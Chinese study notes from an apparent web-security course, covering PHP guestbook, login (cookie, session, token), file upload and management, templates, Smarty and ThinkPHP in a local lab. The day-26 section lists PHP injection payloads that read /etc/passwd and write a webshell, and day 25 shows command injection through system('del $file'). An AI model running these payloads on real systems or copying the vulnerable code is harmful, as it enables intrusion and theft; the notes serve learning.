![image-20250805153415668](D:\cyberspace\笔记\图片\image-20250805153415668.png)

### 邮箱资产

https://hunter.io/

![image-20250805154454200](D:\cyberspace\笔记\图片\image-20250805154454200.png)

<br/>

# 安全开发总思维导图

![image-20250807092929727](D:\cyberspace\笔记\图片\image-20250807092929727.png)

# 第22天：安全开发-PHP应用&留言板功能&超全局变量&数据库操作&第三方插件引用

```
#章节点 
PHP：（逻辑越权安全代码） 
功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等 技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&下载删除; 
技术：JS&CSS 混用，Cookie,Session 操作，MVC 架构，ThinkPHP 引用等。 
```

```
1、PHP 留言板前后端功能实现 
2、数据库创建&架构&增删改查 
3、内置超全局变量&HTML&JS 混编 
4、第三方应用插件&传参&对象调用 


#开发环境： 
DW + PHPStorm + PhpStudy + Navicat Premium 
DW : HTML&JS&CSS开发 
PHPStorm : 专业PHP开发IDE 
PhpStudy ：Apache MYSQL环境 
Navicat Premium: 全能数据库管理工具 

#数据导入-mysql架构&库表列 
1、数据库名，数据库表名，数据库列名 
2、数据库数据，格式类型，长度，键等 

#数据库操作-mysqli函数&增删改查 
PHP函数：连接，选择，执行，结果，关闭等 
参考：https://www.runoob.com/php/php-ref-mysqli.html 
常用： 
mysqli_connect() 打开一个到MySQL的新的连接。 
mysqli_select_db() 更改连接的默认数据库。 
mysqli_query() 执行某个针对数据库的查询。 
mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。 
mysqli_close() 关闭先前打开的数据库连接。 
MYSQL增删改查： 
查：select * from 表名 where 列名='条件'; 
增：insert into 表名(`列名1`, `列名2`) value('列1值1', '列2值2'); 
删：delete from 表名 where 列名 = '条件'; 
改：update 表名 set 列名 = 数据 where 列名 = '条件'; 

#数据接收输出-html混编&超全局变量 
1、html混编：使HTML(JS)在PHP语言中运行 
<?php 
echo '<script>alert('x');</script>' 
?> 
2、超全局变量： 
参考： 
https://www.w3school.com.cn/php/php_superglobals.asp 
https://www.php.net/manual/zh/language.variables.superglobals.php 
$GLOBALS：这种全局变量用于在 PHP 脚本中的任意位置访问全局变量 
$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息。 
$_REQUEST：$_REQUEST 用于收集 HTML 表单提交的数据。 
$_POST：广泛用于收集提交method="post" 的HTML表单后的表单数据。 
$_GET:收集URL中的发送的数据。也可用于收集提交HTML表单数据(method="get")
$_FILES:文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容
$_ENV:是一个包含服务器端环境变量的数组。
$_COOKIE:是一个关联数组，包含通过cookie传递给当前脚本的内容。
$_SESSION:是一个关联数组，包含当前脚本中的所有session内容。
```

## #数据导入-mysql架构&库表列 

### 开启phpstudy

![image-20250807095247575](D:\cyberspace\笔记\图片\image-20250807095247575.png)

### 打开navicat

新建数据库

![image-20250807095651568](D:\cyberspace\笔记\图片\image-20250807095651568.png)

![image-20250807095739994](D:\cyberspace\笔记\图片\image-20250807095739994.png)

![image-20250807095849282](D:\cyberspace\笔记\图片\image-20250807095849282-1754531929631-1.png)

![image-20250807095919399](D:\cyberspace\笔记\图片\image-20250807095919399.png)

![image-20250808103426268](D:\cyberspace\笔记\图片\image-20250808103426268.png)

有数据库名，数据库表名，数据库列名

数据库数据，格式类型，长度，键等

## phpstorm或者DW代码编写

phpstorm

### 新建php文件

![image-20250807154909320](D:\cyberspace\笔记\图片\image-20250807154909320.png)

点击这个在右侧可以看到实时效果

![image-20250807154953386](D:\cyberspace\笔记\图片\image-20250807154953386.png)

php小白，跟着一步步写的

### 先把用户名、内容和提交按钮写出来

![image-20250808105525214](D:\cyberspace\笔记\图片\image-20250808105525214.png)

我们去预览界面查看一下

![image-20250808105552217](D:\cyberspace\笔记\图片\image-20250808105552217.png)

### 接收内容

![image-20250808105651132](D:\cyberspace\笔记\图片\image-20250808105651132.png)

预览

![image-20250808105713099](D:\cyberspace\笔记\图片\image-20250808105713099.png)

### 数据库通讯

![image-20250808110319105](D:\cyberspace\笔记\图片\image-20250808110319105.png)

连上了，然后再是执行sql语句将数据插入到数据库的表当中去

### sql插入

![image-20250808112256916](D:\cyberspace\笔记\图片\image-20250808112256916.png)

提交之后查看表

![image-20250808112212676](D:\cyberspace\笔记\图片\image-20250808112212676.png)

可以，为了防止空数据的提交再加一个if条件检查是否是空数据

![image-20250808112529411](D:\cyberspace\笔记\图片\image-20250808112529411.png)

输出提交信息，弹窗

![image-20250808112852545](D:\cyberspace\笔记\图片\image-20250808112852545.png)

![image-20250808112836842](D:\cyberspace\笔记\图片\image-20250808112836842.png)

### 显示留言数据

![image-20250808114709641](D:\cyberspace\笔记\图片\image-20250808114709641.png)

输入显示：

![image-20250808114647376](D:\cyberspace\笔记\图片\image-20250808114647376.png)

表数据：

![image-20250808114726734](D:\cyberspace\笔记\图片\image-20250808114726734.png)

这个输出不是很好看，加上换行

![image-20250808115149049](D:\cyberspace\笔记\图片\image-20250808115149049.png)

![image-20250808115141586](D:\cyberspace\笔记\图片\image-20250808115141586.png)

## 后台管理

创建新目录admin，admin下面创建gbook_admin.php用来专门管理留言文件，但是每一个文件都需要数据库的连接话会很麻烦，所以我们定义一个全局配置文件config.php，写入数据库连接的那一部分

### config

![image-20250808115528180](D:\cyberspace\笔记\图片\image-20250808115528180.png)

这样的话在其他的文件中如果需要这一部分的就直接inclde就ok

### include

![image-20250808115654368](D:\cyberspace\笔记\图片\image-20250808115654368.png)

![image-20250808115809627](D:\cyberspace\笔记\图片\image-20250808115809627.png)

admin下面的gbook：

![image-20250808115855121](D:\cyberspace\笔记\图片\image-20250808115855121.png)

查询并且删除数据

![image-20250808121632880](D:\cyberspace\笔记\图片\image-20250808121632880.png)

为了方便可以把这些功能写成函数

### 函数

![image-20250808152257240](D:\cyberspace\笔记\图片\image-20250808152257240.png)

![image-20250808152304136](D:\cyberspace\笔记\图片\image-20250808152304136.png)

提交

![image-20250808152311568](D:\cyberspace\笔记\图片\image-20250808152311568.png)

![image-20250808152326457](D:\cyberspace\笔记\图片\image-20250808152326457.png)

![image-20250808152335447](D:\cyberspace\笔记\图片\image-20250808152335447.png)

如此一来我们就可以将专门显示内容的gbook_admin.php调用函数了

### 调用函数

![image-20250808153054566](D:\cyberspace\笔记\图片\image-20250808153054566.png)

这里的删除键除了点问题，我去问了一下AI修正了

display函数

![image-20250808154211539](D:\cyberspace\笔记\图片\image-20250808154211539.png)

gbook_admin.php：

![image-20250808154224229](D:\cyberspace\笔记\图片\image-20250808154224229.png)

![image-20250808154836233](D:\cyberspace\笔记\图片\image-20250808154836233.png)

## ueditor

一个插件，可以让页面输入上传图片，新建目录之后直接把文件夹拖进去

然后发现一直报错，索性直接复制去对应目录下面了

![image-20250808155800706](D:\cyberspace\笔记\图片\image-20250808155800706.png)

在gbook文件最前面先快捷键<!加tab搞个框架

![image-20250808155946476](D:\cyberspace\笔记\图片\image-20250808155946476.png)

引入ueditor的文件

![image-20250808165949147](D:\cyberspace\笔记\图片\image-20250808165949147.png)

我们改一下内容，让它可以输入图片

![image-20250808160908184](D:\cyberspace\笔记\图片\image-20250808160908184.png)

这里直接用浏览器打开还是显示不完全，我们去小皮新建一个网站，目录指向demo01

![image-20250808161137342](D:\cyberspace\笔记\图片\image-20250808161137342.png)

![image-20250808161220090](D:\cyberspace\笔记\图片\image-20250808161220090.png)

学到了一点phpstrom的快捷键

```
ctrl+alt+i	一键格式化
<!+tab	一键框架
```

<br/>

# 第23天：安全开发-PHP应用&后台模块&Session&Cookie&Token&身份验证&唯一性

```
#章节点 
PHP：（逻辑越权安全代码） 
功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等 技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&下载删除; 
技术：JS&CSS 混用，Cookie,Session 操作，MVC 架构，ThinkPHP 引用等。 


1、PHP 后台身份验证模块实现 
2、Cookie&Session 技术&差异 
3、Token 数据包唯一性应用场景 
项目 1：用 cookie 做后台身份验证 
项目 2：用 session 做后台身份验证 
项目 3：用 token 做用户登录判断 


#身份验证-Cookie使用 
生成cookie的原理图过程：见图 
1、客户端向服务器发送HTTP请求。
2、服务器检查请求头中是否包含cookie信息。
3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。
4、服务器在响应头中设置cookie信息并将其发送回客户端。
5、客户端接收响应并将cookie保存在本地。
6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。
7、服务器收到请求并检查cookie的有效性。
8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。

setcookie(): 设置一个cookie并发送到客户端浏览器。
unset(): 用于删除指定的cookie。

#身份验证-Session使用 
1、客户端向服务器发送HTTP请求。
2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。
3、服务器将生成的session ID作为一个cookie发送给客户端。
4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。
5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。
6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。

session_start(): 启动会话，用于开始或恢复一个已经存在的会话。
$_SESSION: 用于存储和访问当前会话中的所有变量。
session_destroy(): 销毁当前会话中的所有数据。
session_unset(): 释放当前会话中的所有变量。
Session存储路径：PHP.INI中session.save_path设置路径 

#唯一性判断-Token使用 
1、生成Token并将其存储在Session 
2、生成Token并将其绑定在Cookie触发 
3、尝试登录表单中带入Token验证逻辑 
4、思考Token安全特性 

#具体安全知识点:
-Cookie和Session都是用来在web应用程序中跟踪用户状态的机制
1、存储位置不同:
Cookie是存储在客户端(浏览器)上的，而Session是存储在服务器端的。
2、安全性不同:
Cookie存储在客户端上，可能会被黑客利用窃取信息，而session存储在服务器上，更加安全。
3、存储容量不同:
Cookie的存储容量有限，一般为4KB，而session的存储容量理论上没有限制，取决于服务器的硬件和配置。
4、生命周期不同:
Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而session一般默认在浏览器关闭后就会过期。
5、访问方式不同:
Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。
6、使用场景不同:
Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而session一般用于
总之，Cookie和session都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用Session;如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用Cookie。


1、PHP后台身份验证模块实现
2、Cookie&Session技术&差异
3、Token数据包唯一性应用场景项目
1:用cookie做后台身份验证项目
2:用session做后台身份验证项目
3:用token做用户登录判断
```

## #身份验证-Cookie使用 

三个文件，分别是登陆文件、登陆成功后的首页、登出文件

![image-20250809132524530](D:\cyberspace\笔记\图片\image-20250809132524530.png)

ai写一个前端界面

![image-20250809132452580](D:\cyberspace\笔记\图片\image-20250809132452580.png)

php逻辑

![image-20250810120119167](D:\cyberspace\笔记\图片\image-20250810120119167.png)

![image-20250810115926808](D:\cyberspace\笔记\图片\image-20250810115926808.png)

添加登陆成功的跳转和失败的弹窗，成功了没有弹窗所以注释掉了

因为登陆成功的页面现在是可以直接访问的，所以需要加上验证，admin_c设置cookie

![image-20250810143417935](D:\cyberspace\笔记\图片\image-20250810143417935.png)

index_c进行判断

![image-20250810191511147](D:\cyberspace\笔记\图片\image-20250810191511147.png)

logout文件

![image-20250810191522832](D:\cyberspace\笔记\图片\image-20250810191522832.png)

我们先看admin_c的cookie，没登陆之前的

![image-20250810191703359](D:\cyberspace\笔记\图片\image-20250810191703359.png)

是没有账号密码的，现在直接打开index_c是打不开的

![image-20250810191907282](D:\cyberspace\笔记\图片\image-20250810191907282.png)

登陆完之后再来看admin_c会发现cookie显示了账号密码

![image-20250810192112323](D:\cyberspace\笔记\图片\image-20250810192112323.png)

并且直接访问index_c也可以直接访问了

![image-20250810192332378](D:\cyberspace\笔记\图片\image-20250810192332378.png)

点退出登录就回到登陆界面了

当我们有cookie时，可以自己添加，正确之后就可以直接访问index_c文件

![image-20250810192846887](D:\cyberspace\笔记\图片\image-20250810192846887.png)

![image-20250810192911392](D:\cyberspace\笔记\图片\image-20250810192911392.png)

## #身份验证-Session使用 

index_s.php、admin_s.php、logout_s.php

admin_s的表单部分和连接数据库、接受输入是一样的，开始在查询到数据库有对应的账号密码后设置session

![image-20250810194524760](D:\cyberspace\笔记\图片\image-20250810194524760.png)

查看Session存储路径：PHP.INI中session.save_path设置路径

![image-20250810194734540](D:\cyberspace\笔记\图片\image-20250810194734540.png)

![image-20250810194825838](D:\cyberspace\笔记\图片\image-20250810194825838.png)

我们去尝试登陆一下，在对应的目录下面生成了文件

![image-20250810195032164](D:\cyberspace\笔记\图片\image-20250810195032164.png)

出了一点问题，生成的文件没有内容，后续修改直接连文件都不生成了

原来是浏览器出了问题，登陆之后会产生文件：

![image-20250810220322646](D:\cyberspace\笔记\图片\image-20250810220322646.png)

![image-20250810220411978](D:\cyberspace\笔记\图片\image-20250810220411978.png)

f12查看

![image-20250810220352765](D:\cyberspace\笔记\图片\image-20250810220352765.png)

session和文件名一样的

index_s文件判断：

![image-20250810220054780](D:\cyberspace\笔记\图片\image-20250810220054780.png)

登录成功后可以看到session

![image-20250810220116520](D:\cyberspace\笔记\图片\image-20250810220116520.png)

这个和cookie类似，知道文件名之后在浏览器添加也可以直接访问index_s，但是当浏览器关闭之后session就会失效

登出文件：

![image-20250810220930572](D:\cyberspace\笔记\图片\image-20250810220930572.png)

登出之后session文件也会消失

## #唯一性判断-Token使用

一个数据包带一个token

token文件：

![image-20250812165938630](D:\cyberspace\笔记\图片\image-20250812165938630.png)

![image-20250812165947548](D:\cyberspace\笔记\图片\image-20250812165947548.png)

token_check文件：

![image-20250812170031485](D:\cyberspace\笔记\图片\image-20250812170031485.png)

![image-20250812170145268](D:\cyberspace\笔记\图片\image-20250812170145268.png)

当我们尝试爆破账号密码时会发现即使你字典里面有正确的账号密码也会显示失败

![image-20250812171056331](D:\cyberspace\笔记\图片\image-20250812171056331.png)

![image-20250812171124589](D:\cyberspace\笔记\图片\image-20250812171124589.png)

<br/>

# 第24天：安全开发-PHP应用&文件管理模块&显示上传&黑白名单类型过滤&访问控制

```
1、PHP 文件管理-显示&上传功能实现 
2、文件上传-$_FILES&过滤机制实现 
3、文件显示-目录遍历&过滤机制实现 

#章节点 
PHP：（逻辑越权安全代码） 
功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等 技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&下载删除; 
技术：JS&CSS 混用，Cookie,Session 操作，MVC 架构，ThinkPHP 引用等。 


#文件管理模块-上传-过滤机制 
1、无过滤机制 
2、黑名单过滤机制 
3、白名单过滤机制 
4、文件类型过滤机制 

$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、时文件名等信息。
$_FILES["表单值"]["name"] 获取上传文件原始名称 
$_FILES["表单值"]["type"] 获取上传文件MIME类型 
$_FILES["表单值"]["size"] 获取上传文件字节单位大小 
$_FILES["表单值"]["tmp_name"] 获取上传的临时副本文件名 
$_FILES["表单值"]["error"] 获取上传时发生的错误代码 
move_uploaded_file() 将上传的文件移动到指定位置的函数 

#文件管理模块-显示-过滤机制 
功能：显示 上传 下载 删除 编辑 包含等 
1.打开目录读取文件列表 
2.递归循环读取文件列表 
3.判断是文件还是文件夹 
4.PHP.INI目录访问控制 

is_dir() 函数用于检查指定的路径是否是一个目录 
opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录 
readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录 
open_basedir：PHP.INI中的设置用来控制脚本程序访问目录 
```

## #文件管理模块-上传-过滤机制

upload.html：

![image-20250813170906867](D:\cyberspace\笔记\图片\image-20250813170906867.png)

upload.php获取文件属性

![image-20250813170854530](D:\cyberspace\笔记\图片\image-20250813170854530.png)

![image-20250813170842602](D:\cyberspace\笔记\图片\image-20250813170842602.png)

可以正常显示

设置黑名单

![image-20250813223821023](D:\cyberspace\笔记\图片\image-20250813223821023.png)

白名单：

![image-20250813224441097](D:\cyberspace\笔记\图片\image-20250813224441097.png)

MIME文件类型过滤

![image-20250813225208227](D:\cyberspace\笔记\图片\image-20250813225208227.png)

## 查看目录

![image-20250813232751393](D:\cyberspace\笔记\图片\image-20250813232751393.png)

![image-20250813232759510](D:\cyberspace\笔记\图片\image-20250813232759510.png)

目录查看权限，任意文件目录

![image-20250813233130283](D:\cyberspace\笔记\图片\image-20250813233130283.png)

php配置文件中open_base去掉注释（不知道为啥我这个没成功

![image-20250813233819646](D:\cyberspace\笔记\图片\image-20250813233819646.png)

或者在函数里面过滤当访问有./就过滤掉

设置文件夹权限

<br/>

# 第25天：安全开发-PHP应用&文件管理&包含&写入&删除&下载&上传&遍历&安全

```
1、PHP 文件管理-下载&删除功能实现 
2、PHP 文件管理-编辑&包含功能实现 

#章节点 
PHP：（逻辑越权安全代码） 
功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等 技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&下载删除; 
技术：JS&CSS 混用，Cookie,Session 操作，MVC 架构，ThinkPHP 引用等。 

#PHP 文件操作安全 
-文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历 
 
#文件包含： 
include() 在错误发生后脚本继续执行 
require() 在错误发生后脚本停止执行 
include_once() 如果已经包含，则不再执行 
require_once() 如果已经包含，则不再执行 
 
#文件上传： 
1、无过滤机制 
2、黑名单过滤机制 
3、白名单过滤机制 
4、文件类型过滤机制 
 
架构： 
1、上传至服务器本身的存储磁盘(源码在一起) 
2、云产品 OSS 存储对象去存储文件(泄漏安全) 
3、把文件上传到其他域名,如：www.xiaodi8.com->upload.xiaodi8.com 
 
$_FILES：PHP 中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。 
$_FILES["表单值"]["name"] 获取上传文件原始名称 
$_FILES["表单值"]["type"] 获取上传文件 MIME 类型 
$_FILES["表单值"]["size"] 获取上传文件字节单位大小 
$_FILES["表单值"]["tmp_name"] 获取上传的临时副本文件名 
$_FILES["表单值"]["error"] 获取上传时发生的错误代码 
move_uploaded_file() 将上传的文件移动到指定位置的函数 
 
#文件显示： 
1.打开目录读取文件列表 
2.递归循环读取文件列表 
3.判断是文件还是文件夹 
4.PHP.INI 目录访问控制 
is_dir() 函数用于检查指定的路径是否是一个目录 
opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录 
readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录  
```

## OSS

阿里云开通oss，创建bucket

![image-20250814165138503](D:\cyberspace\笔记\图片\image-20250814165138503.png)

![image-20250814165323266](D:\cyberspace\笔记\图片\image-20250814165323266.png)

url

![image-20250814165709918](D:\cyberspace\笔记\图片\image-20250814165709918.png)

![image-20250814165723486](D:\cyberspace\笔记\图片\image-20250814165723486.png)

搜对象存储OSS进来

![image-20250814170637012](D:\cyberspace\笔记\图片\image-20250814170637012.png)

前端泄露了accesskey和id，获取到之后可以直接通过oss浏览器进行连接然后获取上传的文件

![image-20250814205723116](D:\cyberspace\笔记\图片\image-20250814205723116.png)

![image-20250814205925016](D:\cyberspace\笔记\图片\image-20250814205925016.png)

## 文件包含

html是界面，其中文件上传的操作是交给upload.php来完成的，当直接访问upload.php是不会有文件上传框的

![image-20250814174451695](D:\cyberspace\笔记\图片\image-20250814174451695.png)

当php文件包含了html文件之后再去访问php文件就会显示html的内容，也就是上传文件的框

![image-20250814174551342](D:\cyberspace\笔记\图片\image-20250814174551342.png)

![image-20250814174558676](D:\cyberspace\笔记\图片\image-20250814174558676.png)

或者是传参

![image-20250814174640442](D:\cyberspace\笔记\图片\image-20250814174640442.png)

![image-20250814174712302](D:\cyberspace\笔记\图片\image-20250814174712302.png)

![image-20250814174724328](D:\cyberspace\笔记\图片\image-20250814174724328.png)

当然直接访问test只是一个这种代码，但如果用这种函数来就会泄露信息或者是木马地址了

## 文件管理器

这个的php逻辑上节课已经讲过了，这里感觉就是多加了一点显示的东西和美化

### 删除部分可能潜在的漏洞

在代码中，windows可以用del命令删除文件，当代码中是用

```
system("del $file");
```

时，会有命令执行漏洞，也就是之前学过的，两个命令可以同时进行

![image-20250814202043272](D:\cyberspace\笔记\图片\image-20250814202043272.png)

当代码用的是这种来删除文件，我们可以复制删除文件的url

![image-20250814202239615](D:\cyberspace\笔记\图片\image-20250814202239615.png)

![image-20250814202140927](D:\cyberspace\笔记\图片\image-20250814202140927.png)

我们尝试在url后面加上ping命令，为了看到回显我们使用DNSLog

![image-20250814202439735](D:\cyberspace\笔记\图片\image-20250814202439735.png)

![image-20250814202504020](D:\cyberspace\笔记\图片\image-20250814202504020.png)

有了

这个可以用检测是不是目录来过滤，如果不是完整路径的话就不执行

<br/>

# 第26天：安全开发-PHP应用&模版引用&Smarty渲染&MVC模型&数据联动&RCE安全

```
1、PHP 新闻显示-数据库操作读取显示 
2、PHP 模版引用-自写模版&Smarty 渲染 
3、PHP 模版安全-RCE 代码执行&三方漏洞


#新闻列表 
1、数据库创建新闻存储 
2、代码连接数据库读取 
3、页面进行自定义显示 
 
#自写模版引用 
1、页面显示样式编排 
2、显示数据插入页面 
3、引用模版调用触发 
 
#Smarty 模版引用 
下载：https://github.com/smarty-php/smarty/releases 
使用： 
1、创建一个文件夹，命名为 smarty-demo。 
2、下载 Smarty 对应版本并解压缩到该文件夹中。 
3、创建一个 PHP 文件，命名为 index.php，并在文件中添加以下代码： 
<?php
// 引入 Smarty 类文件（Smarty 5.x 方式）
require('../smarty-demo/libs/Smarty.class.php');

// 创建 Smarty 实例（注意命名空间）
$smarty = new Smarty\Smarty();

// 设置 Smarty 相关属性
$smarty->setTemplateDir('../smarty-demo/templates/');
$smarty->setCompileDir('../smarty-demo/templates_c/');
$smarty->setCacheDir('../smarty-demo/cache/');
$smarty->setConfigDir('../smarty-demo/configs/');

// 赋值变量到模板中
$smarty->assign('title', '欢迎使用 Smarty');

// 显示模板
$smarty->display('index.tpl');
4、创建一个名为 index.tpl 的模板文件，并将以下代码复制到上述点定义文件夹中 <!DOCTYPE html> 
<html>
<head>
    <title>{$title}</title>
</head>
<body>
<h1>{$title}</h1>
<p>这是一个使用 Smarty 的例子。</p>
</body>
</html>
```

## 新闻列表

新建数据库

![image-20250815103016189](D:\cyberspace\笔记\图片\image-20250815103016189.png)

添加内容

![image-20250815104325339](D:\cyberspace\笔记\图片\image-20250815104325339.png)

new.php

![image-20250815104740877](D:\cyberspace\笔记\图片\image-20250815104740877-1755226061154-1.png)

![image-20250815104854110](D:\cyberspace\笔记\图片\image-20250815104854110.png)

url是这个和id=1是一样的

![image-20250815104933445](D:\cyberspace\笔记\图片\image-20250815104933445.png)

![image-20250815104945363](D:\cyberspace\笔记\图片\image-20250815104945363.png)

页面名称设置，新建html文件，Title加上花括号

![image-20250815105426454](D:\cyberspace\笔记\图片\image-20250815105426454.png)

new.php

![image-20250815110227057](D:\cyberspace\笔记\图片\image-20250815110227057.png)

![image-20250815110204180](D:\cyberspace\笔记\图片\image-20250815110204180.png)

这样在html中修改title的值就可以显示其值了

当html是模板然后php直接调用html的话可能会产生命令执行，我们把数据库里面写上phpinfo

![image-20250815143252559](D:\cyberspace\笔记\图片\image-20250815143252559.png)

模板需要被调用运行，当模板中被插入命令之后打开php就会被执行，再打开php文件：

![image-20250815205525052](D:\cyberspace\笔记\图片\image-20250815205525052.png)

或者是在html里面写上phpinfo，直接打开html是不会执行的，但是打开php文件就会执行

![image-20250815205637831](D:\cyberspace\笔记\图片\image-20250815205637831.png)

这样就可以执行很多php命令，比如：

```
<?php phpinfo(); ?>  // 显示PHP配置信息
<?php system('uname -a'); ?>  // 显示系统信息
<?php echo `whoami`; ?>  // 显示当前用户
<?php print_r($_SERVER); ?>  // 显示服务器变量
<?php system('ls -la /'); ?>  // 列出根目录
<?php echo file_get_contents('/etc/passwd'); ?>  // 读取系统文件
<?php file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>'); ?> // 写入webshell
```

等等

## Smarty渲染

一个使用PHP写出来的模板引擎，按教程创建index.php和index.tpl

![image-20250815225927737](D:\cyberspace\笔记\图片\image-20250815225927737.png)

尝试在tpl文件里面写入phpinfo发现没有执行，没有直接的RCE漏洞

但是也不一定完全安全

![image-20250815230543819](D:\cyberspace\笔记\图片\image-20250815230543819.png)

[PHP的模板注入（Smarty模板）_smarty模板注入-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/107556915)

也就是说代码审计的时候，需要注意插件、模板、组件什么的都需要审计（ueditor、smarty、shiro、fastjson等等）

<br/>

# 第27天：安全开发-PHP应用&TP框架&路由访问&对象操作&内置过滤绕过&核心漏洞

```
1、TP 框架-开发-路由访问&数据库&文件上传&MVC 模型 
2、TP 框架-安全-不合规写法&内置过滤绕过&版本安全漏洞 
 
#章节点 
PHP：（逻辑越权安全代码） 
功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等 技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&下载删除; 
技术：JS&CSS 混用，Cookie,Session 操作，MVC 架构，ThinkPHP 引用等。

#TP 框架-开发-配置架构&路由&MVC 模型 
参考：https://www.kancloud.cn/manual/thinkphp5_1 1、配置架构-导入使用 
2、路由访问-URL 访问 
3、数据库操作-应用对象 
4、文件上传操作-应用对象 
5、前端页面渲染-MVC 模型 
 
#TP 框架-安全-不安全写法&版本过滤绕过 
1、内置代码写法 
例子：不合规的代码写法-TP5-自写 
2、框架版本安全 
例子 1：写法内置安全绕过-TP5-SQL 注入 
例子 2：内置版本安全漏洞-TP5-代码执行 
```

## thinkphp

安装[thinkPHP 8.0.4 安装-CSDN博客](https://blog.csdn.net/qq_44159028/article/details/142379072)

入口文件，public/index.php，一路找

![image-20250817175559791](D:\cyberspace\笔记\图片\image-20250817175559791.png)

![image-20250817175351636](D:\cyberspace\笔记\图片\image-20250817175351636.png)

这里是php8的版本了，和小迪的不一样，小迪指向application然后里面有index.php文件，这个指向的文件目录下面没有index.php，是在

![image-20250817180138478](D:\cyberspace\笔记\图片\image-20250817180138478.png)

这里，返回的是index（）,return就是显示的界面，可以尝试修改一下

![image-20250817215448075](D:\cyberspace\笔记\图片\image-20250817215448075.png)

![image-20250817215452834](D:\cyberspace\笔记\图片\image-20250817215452834.png)

官方文档：[序言 - ThinkPHP官方手册](https://doc.thinkphp.cn/v8_0/preface.html)

### 路由访问-URL 访问

路径地址：

```
http://serverName/index.php?s=/控制器/操作/[参数名/参数值...]
```

控制器：index，ThinkPHP 会默认调用 `Index` 控制器的 `index` 方法

操作就是方法名：index()

![image-20250817215812657](D:\cyberspace\笔记\图片\image-20250817215812657.png)

如果要出发这个index.php文件url应该就是

```
http://thinphp:3425/index.php?s=/index/index
```

![image-20250817220243024](D:\cyberspace\笔记\图片\image-20250817220243024.png)

![image-20250817220706769](D:\cyberspace\笔记\图片\image-20250817220706769.png)

![image-20250817220716808](D:\cyberspace\笔记\图片\image-20250817220716808.png)

以前学的接收是：

![image-20250817221016206](D:\cyberspace\笔记\图片\image-20250817221016206.png)

访问

```
http://thinphp:3425/index.php?x=1&s=/index/xiaodi
```

![image-20250817221148162](D:\cyberspace\笔记\图片\image-20250817221148162.png)

官方的请求

![image-20250817221531089](D:\cyberspace\笔记\图片\image-20250817221531089.png)

![image-20250817221618582](D:\cyberspace\笔记\图片\image-20250817221618582.png)

```
return $this->request->param('name');
```

获取 HTTP 请求参数，`param('name')` 表示 获取名为 `name` 的请求参数

![image-20250817221944751](D:\cyberspace\笔记\图片\image-20250817221944751.png)

![image-20250817222016827](D:\cyberspace\笔记\图片\image-20250817222016827.png)

```
http://thinphp:3425/index.php?s=/index/xiaodi/name/33550336
```

![image-20250817222042718](D:\cyberspace\笔记\图片\image-20250817222042718.png)

这种也可以

自己可以测试感受一下，新建一个test目录，下面是controller目录，里面是test.php

![image-20250817223509743](D:\cyberspace\笔记\图片\image-20250817223509743.png)

```
http://thinphp:3425/index.php?s=/test/xiaodi/name/33550336
```

这里出了问题访问不了，后续排查



这种就是和传统的一个一个目录下面找index.php文件访问不一样，这个不能一级一级去找然后访问，需要根据他的路由关系去访问

一般thinkphp的核心文件就是controller目录找index文件，核心的代码文件就在控制器controller里面

### 数据库操作-应用对象 

![image-20250817224511662](D:\cyberspace\笔记\图片\image-20250817224511662.png)

修改添加一下

![image-20250817224618865](D:\cyberspace\笔记\图片\image-20250817224618865.png)

![image-20250817230334318](D:\cyberspace\笔记\图片\image-20250817230334318.png)

![image-20250817230340719](D:\cyberspace\笔记\图片\image-20250817230340719.png)

添加一个请求参数

![image-20250817231006429](D:\cyberspace\笔记\图片\image-20250817231006429.png)

这里如果是原生态的开发的话在url里面是会有sql注入的，这里尝试

![image-20250817231129875](D:\cyberspace\笔记\图片\image-20250817231129875.png)

![image-20250817231203106](D:\cyberspace\笔记\图片\image-20250817231203106.png)

![image-20250817231218675](D:\cyberspace\笔记\图片\image-20250817231218675.png)

后续不管什么条件都不会报错显示，也就是使用了tp框架会受到框架内置过滤保护的

### 文件上传操作-应用对象 

public目录新建一个upload.html文件

![image-20250818093618158](D:\cyberspace\笔记\图片\image-20250818093618158.png)

配置上传的文件

![image-20250818094653938](D:\cyberspace\笔记\图片\image-20250818094653938.png)

upload.html

![image-20250818094948892](D:\cyberspace\笔记\图片\image-20250818094948892.png)

index.php

